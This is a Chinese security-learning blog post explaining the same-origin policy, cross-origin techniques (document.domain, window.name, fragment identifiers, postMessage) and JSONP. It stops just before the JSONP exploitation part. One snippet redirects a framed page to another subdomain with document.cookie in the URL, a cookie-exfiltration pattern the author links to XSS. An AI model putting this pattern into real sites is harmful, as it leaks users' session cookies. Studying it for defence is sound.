

<!DOCTYPE html>
<html lang="en" color-mode=light>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>规避浏览器同源策略 &amp; JSONP的原理和利用 - 你好我是王日天@</title>
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="google" content="notranslate" />
  
  <meta name="description" content="1@ 前言前端尤其是 Js 越学越发觉得其灵活度是超出...">
  <meta name="author" content="rt95">
  <link rel="icon" href="/images/favicon.ico" type="image/png" sizes="16x16">
  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
  
    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
    <meta rel="msapplication-TileColor" content="#000000">
  

  
<link rel="stylesheet" href="/css/style.css">


  
    
<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_s6x2xcokxrl.css">

  

  
    
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">

  

  
    
      
        
        
<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-light.min.css" name="highlight-style" mode="light">

      
        
        
<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">

      
  

  <script>
    var CONFIG = window.CONFIG || {};
    var ZHAOO = window.ZHAOO || {};
    CONFIG = {
      isHome: false,
      fancybox: true,
      pjax: false,
      lazyload: {
        enable: true,
        only_post: 'false',
        loading: '/images/loading.gif'
      },
      donate: {
        enable: true,
        alipay: '/image/95.jpg',
        wechat: '/image/95.jpg'
      },
      galleries: {
        enable: true
      },
      fab: {
        enable: true,
        always_show: false
      },
      carrier: {
        enable: true
      },
      daovoice: {
        enable: false
      },
      preview: {
        background: {
          default: '/images/welcome-image.jpg',
          api: ''
        },
        motto: {
          default: '',
          api: '',
          data_contents: '["data","content"]'
        },
      },
      qrcode: {
        enable: true,
        type: 'url',
        image: 'https://pic.izhaoo.com/weapp-code.jpg',
      },
      toc: {
        enable: true
      },
      scrollbar: {
        model: 'simple'
      },
      notification: {
        enable: false,
        delay: 4500,
        list: '',
        page_white_list: '',
        page_black_list: ''
      }
    }
  </script>

  

  

<meta name="generator" content="Hexo 4.2.1"></head>

<body class="lock-screen">
  <div class="loading"></div>
  


  <nav class="navbar">
    <div class="left">
      
        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
      
      
        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
      
    </div>
    <div class="center">规避浏览器同源策略 &amp; JSONP的原理和利用</div>
    <div class="right">
      <i class="iconfont iconmenu j-navbar-menu"></i>
    </div>
    
      <div id="qrcode-navbar"></div>
    
  </nav>

  

<nav class="menu">
  <div class="menu-wrap">
    <div class="menu-close">
      <i class="iconfont iconbaseline-close-px"></i>
    </div>
    <ul class="menu-content"><li class="menu-item">
        <a href="/ " class="underline "> 首页</a>
      </li><li class="menu-item">
        <a href="/archives " class="underline "> 归档</a>
      </li><li class="menu-item">
        <a href="/links " class="underline "> links</a>
      </li><li class="menu-item">
        <a href="/about " class="underline "> 关于</a>
      </li></ul>
    
      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
    
  </div>
</nav>
  <main id="main">
  <div class="article-wrap">
    <div class="row container">
      <div class="col-xl-3"></div>
      <div class="col-xl-6"><article class="article">
  <div class="wrap">
    <section class="head">
  <img   class="lazyload" data-original="/images/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
  <div class="head-mask">
    <h1 class="head-title">规避浏览器同源策略 &amp; JSONP的原理和利用</h1>
    <div class="head-info">
      <span class="post-info-item"><i class="iconfont iconcalendar"></i>September 02, 2019</span>
      
      <span class="post-info-item"><i class="iconfont iconfont-size"></i>14516</span>
    </div>
  </div>
</section>
    <section class="main">
      <section class="content">
        <h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1@ 前言"></a>1@ 前言</h2><p>前端尤其是 Js 越学越发觉得其灵活度是超出一般脚本的。这篇文章，记录下自己对同源策略和 JSONP 的学习，也供有需要的同学参阅。</p>
<h2 id="2-同源策略"><a href="#2-同源策略" class="headerlink" title="2@ 同源策略"></a>2@ 同源策略</h2><p>想必搞安全的初期大都会读过道哥的那本<strong><code>白帽子</code></strong>,书里面靠前的位置就讲过同源策略，不过我想大部分人可能还是对这个概念了解的不是很透彻，我们一起再来温习温习。</p>
<blockquote>
<p>1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。</p>
</blockquote>
<blockquote>
<p>同源策略 （Same Origin Policy）是一种约定。</p>
<p>浏览器的同源策略，限制了来自不同源的 document 或脚本，对当前 document 读取或者设置某些属性。</p>
<p>​                                                                                             ———- 《白帽子讲web安全》</p>
</blockquote>
<h3 id="2-1-介绍"><a href="#2-1-介绍" class="headerlink" title="2.1 介绍"></a>2.1 介绍</h3><p>那么，什么时候两个资源才算是同源呢？</p>
<p>影响两个资源是否同源主要看以下字段是否相同，如果一致，则会被认为是同源的。</p>
<ul>
<li>host(域名或者IP地址)</li>
<li>子域名</li>
<li>端口</li>
<li>协议</li>
</ul>
<p>举个简单的例子：</p>
<p><code>http://test1.rt95.com/test.html</code></p>
<p><code>http://test2.rt95.com/test.html</code></p>
<p>上面两个资源就是不同源的，因为他们的子域名不同 。</p>
<h3 id="2-2-限制范围"><a href="#2-2-限制范围" class="headerlink" title="2.2 限制范围"></a>2.2 限制范围</h3><p>当前，如果非同源，下面的行为会受到限制。</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">（<span class="hljs-number">1</span>） Cookie、LocalStorage 和 IndexDB 无法读取。<br><br>（<span class="hljs-number">2</span>） DOM 无法获得。<br><br>（<span class="hljs-number">3</span>） AJAX 请求不能发送。<br></code></pre></td></tr></table></figure>



<h3 id="2-3-规避同源策略的方法"><a href="#2-3-规避同源策略的方法" class="headerlink" title="2.3 规避同源策略的方法"></a>2.3 规避同源策略的方法</h3><h4 id="1、Cookie"><a href="#1、Cookie" class="headerlink" title="1、Cookie"></a>1、Cookie</h4><p><strong>如果两个网页的一级域名相同，只是二级域名不同，可以通过设置document.domain 共享 Cookie</strong></p>
<ul>
<li>上面这句话其实略带迷惑性，容易想当然。其本质就是页面可以设置 document.domain 为当前子域或者比当前子域更高的域。而一个子域的 cookie 包含了其子域和所有比其更高的域的 cookie，下例实质上是间接设置了主站上的 cookie，而使得所有子域都能访问到 cookie。</li>
</ul>
<p>假如说我们现在有两个测试网站，仅仅是子域名不同，我们通过上面的原理来访问下 cookie 值。</p>
<p>测试网站为阮大佬的博客和书籍页面。</p>
<p>打开 <code>es6.ruanyifeng.com</code>,控制台改变域名：</p>
<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/1.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">1.png</span></p>
<p>然后设置一个 cookie 值：</p>
<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/2.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">2.png</span></p>
<p>继续到博客页面，控制台改变域名和之前相同，然后进行 cookie 访问：</p>
<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/3.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">3.png</span></p>
<p>这种方法只适用于 Cookie 和 iframe 的窗口，LocalStorage 和 IndexDB 不能使用此方法。</p>
<p>一般浏览器前端设置 cookie 的插件，像 EditThisCookie 这种，还是后端设置 cookie，如果没有特殊的用处，都是将 cookie 的 domain 字段设置为当下所属的域，但是如果此域存在一个 xss, 组合利用的话，可以修改 cookie 让另一个子域跨域访问到。</p>
<p>下面再给出一个比较有意思的跨域获取 cookie 的思路：</p>
<ul>
<li>现在在 cms1.test.ink 域下面有一个 1.html,内嵌一个 cms2.test.ink 的 2.html 页面:</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">'http://cms2.test.ink/2.html'</span> <span class="hljs-attr">width</span>=<span class="hljs-string">'100'</span> <span class="hljs-attr">height</span>=<span class="hljs-string">'100'</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"zhaochao"</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<ul>
<li>而 cms2.test.ink 域下面的 2.html 内容如下，其内容是跳转到 cms1.test.ink 域下的 3.html，并且带上自己的cookie：</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript"><span class="hljs-built_in">window</span>.location=<span class="hljs-string">"http://cms1.test.ink/3.html?"</span>+<span class="hljs-built_in">document</span>.cookie;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<ul>
<li>cms1.test.ink 域下面的 3.html 用来接收跨域传递过来的参数，并写在父页面的文本框里：</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript"><span class="hljs-built_in">window</span>.parent.document.getElementById(<span class="hljs-string">"zhaochao"</span>).value=<span class="hljs-built_in">window</span>.location.toString().substring(<span class="hljs-built_in">window</span>.location.toString().indexOf(<span class="hljs-string">"?"</span>));</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure>

<ul>
<li><p>访问 cms1.test.ink/1.html,内嵌 cms2.test.ink/2.html，带 cookie 跳转到 cms1.test.ink/3.html 接收参数，写到主页面。</p>
<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/22.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">22.png</span></p>
</li>
</ul>
<h4 id="2、iframe"><a href="#2、iframe" class="headerlink" title="2、iframe"></a>2、iframe</h4><p>如果两个网页不同源，那么就不能拿到对方的 dom ，像 iframe 和 window.open 窗口，与父窗口无法进行通信。</p>
<p>像在父窗口上使用下述方法来获取 iframe 的标签，就会因为不同源而报错。（本地嵌入一个百度页面进行测试）</p>
<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/4.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">4.png</span></p>
<p>如果父子窗口只是二级域名不同，可以效仿上一点 Cookie 的跨越访问那样，设置 <code>document.domain</code> 一致即可访问。</p>
<p>下面介绍下完全不同源的网站进行跨域访问的三种方法。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">片段识别符（fragment identifier）<br><span class="hljs-keyword">window</span>.name<br>跨文档通信API（<span class="hljs-keyword">Cross</span>-document messaging）<br></code></pre></td></tr></table></figure>



<h4 id="3、片段识别符"><a href="#3、片段识别符" class="headerlink" title="3、片段识别符"></a>3、片段识别符</h4><p>片段识别符（fragment identifier)也就是前端开发中所说的锚点，即 URL 的 <code>#</code> 之后的内容。如果知识改变片段识别符，页面不会重新刷新。</p>
<p>这种父子间的访问方法已经浮出水面：父窗口向子窗口的片段标识符中写入数据，而子窗口可以通过创建一个监听 hash 值的方法来获取父窗口传过来的数据，从而达成通信。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 父窗口写入数据</span><br><span class="hljs-keyword">var</span> src = originRL + <span class="hljs-string">'#'</span> + data;<br>$(<span class="hljs-string">'iframe'</span>).get(<span class="hljs-number">0</span>).src = src；<br></code></pre></td></tr></table></figure>



<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 子窗口查看数据</span><br><span class="hljs-built_in">window</span>.location.href； <span class="hljs-comment">// # 之后有 data 的值</span><br></code></pre></td></tr></table></figure>



<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/5.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">5.png</span></p>
<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/6.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">6.png</span></p>
<h4 id="4、window-name"><a href="#4、window-name" class="headerlink" title="4、window.name"></a>4、window.name</h4><p>window.name 这个属性有个特定就是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页就可以读取到它。（这种方法只能是子窗口向父窗口发送数据）</p>
<p>我们依旧拿上面的例子来演示：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">在父窗口中打开子窗口，键入 <span class="hljs-keyword">window</span>.name 的值 <span class="hljs-comment">-----&gt;</span><br>然后改变 <span class="hljs-keyword">window</span>.<span class="hljs-keyword">location</span> 的值进入到父窗口  <span class="hljs-comment">-----&gt;</span><br>父窗口中获得子窗口的标签，然后读取其 <span class="hljs-keyword">window</span>.name 的值<br></code></pre></td></tr></table></figure>



<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/7.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">7.pg</span></p>
<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/8.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">8.png</span></p>
<h4 id="5、window-postMessage"><a href="#5、window-postMessage" class="headerlink" title="5、window.postMessage"></a>5、window.postMessage</h4><p>上面的方法都属于程序猿们私下闲着没事干破解出来的，而 HTML5 为了解决这个问题。引入了一个全新的 API ：跨文档通信 API （Cross-document-messaging),它为 window 对象多增添了一个 window.postMessage() 的方法，允许跨窗口通信，不管是否同源。</p>
<blockquote>
<p>举例来说，父窗口<code>http://aaa.com</code>向子窗口<code>http://bbb.com</code>发消息，调用<code>postMessage</code>方法就可以了</p>
</blockquote>
<p>我们来看看 w3c 中定义 的 postMessage() 方法的定义</p>
<blockquote>
<p>targetWindow .postMessage（message，targetOrigin，[ transfer ]）</p>
<ul>
<li><p><em>targetWindow</em></p>
<p>对将接收消息的窗口的引用。获得此类引用的方法包括：<code>Window.open</code> （生成一个新窗口然后引用它），<code>Window.opener</code> （引用产生这个的窗口），<code>HTMLIFrameElement.contentWindow</code>（<code>&lt;iframe&gt;</code>从其父窗口引用嵌入式），<code>Window.parent</code>（从嵌入式内部引用父窗口<code>&lt;iframe&gt;</code>）<code>Window.frames</code> +索引值（命名或数字）。</p>
</li>
<li><p><em>message</em></p>
<p>要发送到其他窗口的数据。使用结构化克隆算法序列化数据。这意味着您可以将各种各样的数据对象安全地传递到目标窗口，而无需自己序列化。</p>
</li>
<li><p><em>targetOrigin</em></p>
<p>指定要调度的事件的<code>targetWindow</code>的原点，可以是文字字符串<code>&quot;*&quot;</code>（表示没有首选项），也可以是URI。如果在计划调度事件时，<code>targetWindow</code>文档的方案，主机名或端口与<code>targetOrigin</code>提供的内容不匹配，则不会调度该事件；只有当所有的三个条件都匹配时，将调度该事件。该机制可以控制发送消息的位置；例如，如果<code>postMessage()</code>用于传输密码，则该参数必须是URI，其来源与包含密码的消息的预期接收者相同，以防止恶意第三方拦截密码。<strong>始终提供具体的targetOrigin，而不是*，如果您知道其他窗口的文档应该位于何处。未能提供特定目标会泄露您发送给任何感兴趣的恶意站点的数据。</strong></p>
</li>
<li><p><em>stransfer</em>（可选的）</p>
<p>是与消息一起传输的<code>Transferable</code>对象序列。这些对象的所有权将提供给目标端，并且它们在发送端不再可用。</p>
</li>
</ul>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> popup = <span class="hljs-built_in">window</span>.open(<span class="hljs-string">'http://bbb.com'</span>, <span class="hljs-string">'title'</span>);<br>popup.postMessage(<span class="hljs-string">'Hello World!'</span>, <span class="hljs-string">'http://bbb.com'</span>);<br></code></pre></td></tr></table></figure>

<p>postMessage 的参数是：</p>
<ul>
<li>1、发送的内容</li>
<li>2、接收消息的窗口源，设为 * 时，表示向所有窗口发送。</li>
</ul>
<p>父子窗口均可以通过监听 message 事件来获取消息：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">'message'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) </span>&#123;<br>  <span class="hljs-built_in">console</span>.log(e.data);<br>&#125;,<span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure>



<p>message 事件相关的对象有下面属性：</p>
<ul>
<li><code>event.source</code>：对发送消息的<code>window</code>对象的引用，也就是想要给其发送消息的一方，即上面的 targetWindow。</li>
<li><code>event.origin</code>: 调用当时发送消息的窗口的原点<code>postMessage</code>，即信息来源的一方。</li>
<li><code>event.data</code>: 消息内容</li>
</ul>
<p>接下来我们创建一个父子窗口交互的代码示例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 父窗口 http://127.0.0.1/frametest/test.html</span><br> &lt;iframe src=<span class="hljs-string">"http://127.0.0.1:8086/child.html"</span> frameborder=<span class="hljs-string">"0"</span>&gt;&lt;<span class="hljs-regexp">/iframe&gt;</span><br><span class="hljs-regexp"> &lt;script&gt;</span><br><span class="hljs-regexp">     window.addEventListener('message', receiveMessage);</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">     function receiveMessage(event) &#123;</span><br><span class="hljs-regexp">         document.write('this is receiver\'s receiving data' + event.data);</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">      &#125;</span><br><span class="hljs-regexp"> &lt;/</span>script&gt;<br></code></pre></td></tr></table></figure>



<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html">// 子窗口 http://127.0.0.1:8086/child.html<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript">      <span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">'message'</span>, receiveMessage);</span><br><br><span class="actionscript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">receiveMessage</span><span class="hljs-params">(event)</span> </span>&#123;</span><br><span class="actionscript">          event.source.postMessage(<span class="hljs-string">'message_received'</span>, event.origin);</span><br>          alert(event.data);<br><br>        &#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>



<p>然后在父窗口向子窗口发送信息：(注意我们此时需要先拿到 iframe 标签，通过它来向子窗口发送数据)</p>
<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/9.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">9.png</span></p>
<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/10.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">10.png</span></p>
<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/11.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">11.png</span></p>
<h3 id="2-4-补充"><a href="#2-4-补充" class="headerlink" title="2.4 补充"></a>2.4 补充</h3><p>尽管有同源策略，但是在浏览器中，<code>&lt;script&gt;</code> <code>img</code> <code>iframe</code> <code>&lt;link&gt;</code> 等标签依旧可以跨域加载资源，不受同源策略的控制。一般都是带 <strong>src</strong> 属性的标签，它们加载资源时，其实是由浏览器发出了一次 GET 请求。</p>
<p>除了上面规避同源策略的方法外，还有几种：</p>
<ul>
<li>flash插件发送 http 请求，但必须安装 flash ，和 flash 交互。而现在 flash 已经用的越来越少了，在这里就不细究，有兴趣的同学可以参考道哥书里面的第二章内容。</li>
<li>可以在同源服务器下架设一个代理服务器来转发，代理服务器负责请求跨域内容，而 js 只负责接收即可。</li>
<li>第三种方式即是我们下面要探讨的 JSONP。</li>
</ul>
<h2 id="3-JSONP-介绍"><a href="#3-JSONP-介绍" class="headerlink" title="3@ JSONP 介绍"></a>3@ JSONP 介绍</h2><p>​     JSONP 即 JSON with Padding（填充式 JSON），是应用 JSON 的一种新的方法，常用于服务器和客户端跨源通信，在后来的 Web 服务中非常流行。</p>
<h3 id="3-1-基础知识"><a href="#3-1-基础知识" class="headerlink" title="3.1 基础知识"></a>3.1 基础知识</h3><p> JSONP 的基本思想就是，网页添加一个 <code>&lt;script&gt;</code> 标签，然后向服务器请求数据，服务器传送回来的数据放到请求时 <code>callback</code> 关键字函数中进行处理。这种方法不受同源策略的限制。JSONP 有个要求，就是只能用 GET请求，并且要求返回 Javascript，常见可以被浏览器解析为 js 的数据 mime 类型<a href="https://mathiasbynens.be/demo/javascript-mime-type" target="_blank" rel="noopener">在这</a>,实际上也就是我们上面补充点中说的，<code>&lt;script&gt;</code> 等标签可以跨域加载资源。</p>
<p>我们来看一个例子：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 构造一个加载跨域数据的脚本，来读取当前价格指数</span><br> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">refreshPrice</span>(<span class="hljs-params">data</span>) </span>&#123; <span class="hljs-comment">//构造回调函数</span><br>            <span class="hljs-keyword">var</span> p = $(<span class="hljs-string">'p#content'</span>).get(<span class="hljs-number">0</span>);<br>            p.innerHTML = <span class="hljs-string">'当前价格'</span> +<br>                data[<span class="hljs-string">'0000001'</span>].name + <span class="hljs-string">': '</span> +<br>                data[<span class="hljs-string">'0000001'</span>].price + <span class="hljs-string">'；'</span> +<br>                data[<span class="hljs-string">'1399001'</span>].name + <span class="hljs-string">': '</span> +<br>                data[<span class="hljs-string">'1399001'</span>].price;<br>        &#125;<br>  <span class="hljs-keyword">var</span> js = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'script'</span>);<br>  head = $(<span class="hljs-string">'head'</span>);<br>  js.src = <span class="hljs-string">"http://api.money.126.net/data/feed/0000001,1399001？callback=refreshPrice"</span>;<br>  head.append(js);  <span class="hljs-comment">// 添加标签，加载数据，触发回调函数</span><br></code></pre></td></tr></table></figure>



<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/12.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">12.png</span></p>
<p>从这个例子我们也可以看出来，JSONP 由两部分组成：</p>
<ul>
<li>回调函数</li>
<li>请求传入的数据</li>
</ul>
<p>再举一个我们生活中大概率会碰到的例子：百度。</p>
<p>百度搜索框也是利用了 JSONP 的技术，我们可以通过下面的查询 URL 看出端倪。</p>
<p><code>https://sp0.baidu.com/5a1Fazu8AA54nxGko9WTAnF6hhy/su?wd=西电&amp;&amp;cb=a</code></p>
<p>结果为：</p>
